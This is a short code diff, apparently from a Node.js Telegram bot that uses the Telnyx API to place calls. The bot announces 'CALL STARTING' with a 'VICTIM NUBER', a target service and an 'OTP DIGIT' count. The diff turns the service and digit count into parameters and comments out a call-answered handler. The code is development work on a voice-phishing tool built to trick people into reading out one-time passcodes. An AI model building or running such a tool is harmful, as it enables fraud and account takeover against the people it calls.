@@ -14,14 +14,14 @@ const express = require('express');
 const app = express();
 const port = process.env.PORT || 3000;
 
-async function call (customer_number, ctx){
+async function call (customer_number, ctx, service, digit){
    console.log(ctx, 'first yayyyy')
    bot.telegram.sendMessage(ctx.chat.id, 
       `
       CALL STARTING\n 
       VICTIM NUBER - ${customer_number}\n 
-      SERIVCE - ${1}\n
-      OTP DIGIT - ${6}
+      SERIVCE - ${service}\n
+      OTP DIGIT - ${digit}
       `, {})
 
    // Use the Telnyx API to create a new call
@@ -37,9 +37,9 @@ async function call (customer_number, ctx){
    }
 
 
-   call.answered({
+   // call.answered({
 
-   })
+   // })
 }
 
 
